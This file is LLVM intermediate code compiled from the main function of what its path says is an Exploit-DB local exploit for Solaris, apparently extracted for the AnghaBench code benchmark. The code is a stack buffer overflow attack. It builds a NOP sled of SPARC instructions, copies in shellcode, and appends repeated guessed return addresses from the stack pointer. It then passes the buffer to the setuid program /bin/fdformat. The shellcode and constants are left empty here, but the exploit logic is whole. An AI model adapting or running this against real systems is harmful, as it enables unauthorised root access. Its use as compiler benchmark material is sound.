; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_328.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_328.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_LENGTH = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@sparc_shellcode = common dso_local global i32* null, align 8
@STACK_OFFSET = common dso_local global i32 0, align 4
@SPARC_NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"Jumping to address 0x%lx B[%d] E[%d] SO[%d]\0A\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"/bin/fdformat\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"fdformat\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = load i32, i32* @BUF_LENGTH, align 4
  %14 = load i32, i32* @EXTRA, align 4
  %15 = add nsw i32 %13, %14
  %16 = add nsw i32 %15, 8
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %5, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %6, align 8
  %20 = load i32*, i32** @sparc_shellcode, align 8
  %21 = call i32 @strlen(i32* %20)
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %3, align 4
  %23 = icmp sgt i32 %22, 1
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %4, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27)
  store i32 %28, i32* %12, align 4
  br label %29

29:                                               ; preds = %24, %2
  %30 = bitcast i8* %19 to i32*
  store i32* %30, i32** %8, align 8
  %31 = call i32 (...) @get_sp()
  %32 = load i32, i32* @STACK_OFFSET, align 4
  %33 = sub nsw i32 %31, %32
  %34 = load i32, i32* %12, align 4
  %35 = sub nsw i32 %33, %34
  %36 = sext i32 %35 to i64
  store i64 %36, i64* %7, align 8
  store i32 0, i32* %10, align 4
  br label %37

37:                                               ; preds = %50, %29
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = load i32, i32* @BUF_LENGTH, align 4
  %41 = load i32, i32* %11, align 4
  %42 = sub nsw i32 %40, %41
  %43 = sext i32 %42 to i64
  %44 = udiv i64 %43, 4
  %45 = icmp ult i64 %39, %44
  br i1 %45, label %46, label %53

46:                                               ; preds = %37
  %47 = load i32, i32* @SPARC_NOP, align 4
  %48 = load i32*, i32** %8, align 8
  %49 = getelementptr inbounds i32, i32* %48, i32 1
  store i32* %49, i32** %8, align 8
  store i32 %47, i32* %48, align 4
  br label %50

50:                                               ; preds = %46
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  br label %37

53:                                               ; preds = %37
  %54 = load i32*, i32** %8, align 8
  store i32* %54, i32** %9, align 8
  store i32 0, i32* %10, align 4
  br label %55

55:                                               ; preds = %67, %53
  %56 = load i32, i32* %10, align 4
  %57 = load i32, i32* %11, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %70

59:                                               ; preds = %55
  %60 = load i32*, i32** @sparc_shellcode, align 8
  %61 = load i32, i32* %10, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i32, i32* %60, i64 %62
  %64 = load i32, i32* %63, align 4
  %65 = load i32*, i32** %9, align 8
  %66 = getelementptr inbounds i32, i32* %65, i32 1
  store i32* %66, i32** %9, align 8
  store i32 %64, i32* %65, align 4
  br label %67

67:                                               ; preds = %59
  %68 = load i32, i32* %10, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %10, align 4
  br label %55

70:                                               ; preds = %55
  %71 = load i32*, i32** %9, align 8
  store i32* %71, i32** %8, align 8
  store i32 0, i32* %10, align 4
  br label %72

72:                                               ; preds = %84, %70
  %73 = load i32, i32* %10, align 4
  %74 = sext i32 %73 to i64
  %75 = load i32, i32* @EXTRA, align 4
  %76 = sext i32 %75 to i64
  %77 = udiv i64 %76, 4
  %78 = icmp ult i64 %74, %77
  br i1 %78, label %79, label %87

79:                                               ; preds = %72
  %80 = load i64, i64* %7, align 8
  %81 = trunc i64 %80 to i32
  %82 = load i32*, i32** %8, align 8
  %83 = getelementptr inbounds i32, i32* %82, i32 1
  store i32* %83, i32** %8, align 8
  store i32 %81, i32* %82, align 4
  br label %84

84:                                               ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %10, align 4
  br label %72

87:                                               ; preds = %72
  %88 = load i64, i64* %7, align 8
  %89 = load i32, i32* @BUF_LENGTH, align 4
  %90 = load i32, i32* @EXTRA, align 4
  %91 = load i32, i32* @STACK_OFFSET, align 4
  %92 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i64 %88, i32 %89, i32 %90, i32 %91)
  %93 = getelementptr inbounds i8, i8* %19, i64 1
  %94 = call i32 @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %93, i8* null)
  %95 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %96 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %96)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i32*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i64, i32, i32, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
